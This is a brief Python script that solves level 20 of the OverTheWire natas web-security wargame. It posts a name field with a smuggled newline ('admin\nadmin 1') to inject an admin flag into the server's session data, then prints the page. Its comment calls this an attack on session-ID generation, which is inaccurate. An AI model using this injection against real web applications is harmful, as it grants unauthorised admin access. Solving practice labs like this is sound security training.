"""
Help script to resolve natas challenge #20
"""
import requests
import json

level = 'natas20'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we perform an attack against a poorly designed algorithm for generating the session ID.

"""
session = requests.Session()
session.post(url,
             data={"name": "admin\nadmin 1"},
             auth=auth)
# Once the session has been modified, we do another request to display the new state.
response = session.get(url, auth=auth)
print(response.text)
